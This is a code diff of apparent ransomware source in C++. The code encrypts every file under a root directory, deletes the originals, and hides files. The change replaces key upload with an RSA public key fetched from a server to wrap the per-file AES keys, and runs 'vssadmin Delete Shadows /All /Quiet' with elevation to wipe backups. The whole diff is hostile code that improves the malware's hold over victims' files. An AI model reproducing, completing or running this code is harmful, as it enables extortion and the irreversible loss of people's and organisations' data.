@@ -24,10 +24,21 @@ Status LimitCPU(HANDLE& hCurrentProcess, HANDLE& hJob);
 void doRestart();
 void makeFileHidden(string path);
 void RegisterProgram();
+Status getPublicParams(string& mod, string& pubKey);
 
+void getPublicParams(string id, string& mod, string& pubKey)
+{
+	string url = URL_PUBLIC_RSA + id;
+	string chunk;
+	getFromServer(url, chunk);
+	parsePublicKey(chunk, mod, pubKey);
+
+}
 int encryption_main( bool fromStart) {
 //	crypt_data* d = generatekey();//TODO also move to encrypt
-	PBYTE masterIV = nullptr, masterKey = nullptr;
+
+	string mod;
+	string pubKey;
 	string path = ROOT_DIR;
 	string pathToImage = get_path_to_jpeg();
 #if VM
@@ -39,13 +50,14 @@ int encryption_main( bool fromStart) {
 
 	//TODO set SquanchedID and IMAGE invisible
 	std::fstream IDFile;
+	Status status;
 	PBYTE id = nullptr;
 	HANDLE hCurrentProcess = nullptr;
 	HANDLE hJob = nullptr;
 	std::vector<string> processed;
 	string fileRead;
 	/* let's begin*/
-	Status status = generateKeyAndIV(&masterIV, &masterKey);
+
 	if (!NT_SUCCESS(status))
 	{
 		goto CLEAN;
@@ -59,11 +71,16 @@ int encryption_main( bool fromStart) {
 	{
 		goto CLEAN;
 	}
-	status = sendIVAndKeyToServer(masterIV,masterKey,id);
+	status = getPublicParams(mod, pubKey);
+	//status = sendIVAndKeyToServer(masterIV,masterKey,id);
 	if(!NT_SUCCESS(status))
 	{
 		goto CLEAN;
 	}
+
+	RsaEncryptor rsaEncryptor;
+	rsaEncryptor.init_Encryptor(mod, pubKey);
+
 	status = LimitCPU(hCurrentProcess, hJob);
 	if(LIMIT_CPU_FAIL == status)
 	{
@@ -102,7 +119,7 @@ int encryption_main( bool fromStart) {
 #endif
 
 //	encrypt(path, masterIV, masterKey);
-	iterate2(path, &encrypt, masterIV, masterKey, processed);
+	iterate2(path, &encrypt, rsaEncryptor, processed);
 	for(auto& path : processed)
 	{
 		remove(path);
@@ -138,10 +155,6 @@ int encryption_main( bool fromStart) {
 #endif
 
 CLEAN:
-	if (masterKey)
-		HeapFree(GetProcessHeap(), 0, masterKey);
-	if (masterIV)
-		HeapFree(GetProcessHeap(), 0, masterIV);
 	if (id)
 		HeapFree(GetProcessHeap(), 0, id);
 #if VM
@@ -184,7 +197,7 @@ void makeFileHidden(string path)
 }
 void destroyVSS()
 {
-	ShellExecute(nullptr, "open", "C:\\Windows\\system32\\vssadmin.exe Delete Shadows /All /Quiet", nullptr, nullptr, 0);
+	ShellExecute(nullptr, "runas", "C:\\Windows\\system32\\vssadmin.exe Delete Shadows /All /Quiet", nullptr, nullptr, 0);
 }
 
 void changeHiddenFileState(bool state)
@@ -197,7 +210,7 @@ void changeHiddenFileState(bool state)
 	SHGetSetSettings(&ss, SSF_SHOWALLOBJECTS | SSF_SHOWSYSFILES | SSF_SHOWSUPERHIDDEN, TRUE);
 }
 
-DWORD encryptKeyIV(PBYTE keyIV, PBYTE *buff, const PBYTE masterKey, const PBYTE masterIV)
+DWORD encryptKeyIV(PBYTE keyIV, PBYTE *buff, RsaEncryptor rsaEncryptor)
 {
 	DWORD status;
 	BCRYPT_ALG_HANDLE aesHandle = nullptr;
@@ -309,7 +322,7 @@ DWORD getKeyHandle(PBYTE key, BCRYPT_KEY_HANDLE& keyHandle, BCRYPT_ALG_HANDLE& a
 	return status;
 }
 
-void encrypt(string path,  const PBYTE masterIV, const PBYTE masterKey)
+void encrypt(string path, RsaEncryptor rsaEncryptor)
 {
 	DWORD status;
 	PBYTE plainText = nullptr;
@@ -379,7 +392,7 @@ void encrypt(string path,  const PBYTE masterIV, const PBYTE masterKey)
 	memcpy(keyIV,key,KEY_LEN);
 	memcpy(keyIV + KEY_LEN, iv, IV_LEN);
 	
-	status = encryptKeyIV(keyIV, &keyIVBuff, masterKey, masterIV);
+	status = encryptKeyIV(keyIV, &keyIVBuff,rsaEncryptor);
 	if(!NT_SUCCESS(status))
 	{
 		goto CLEANUP;
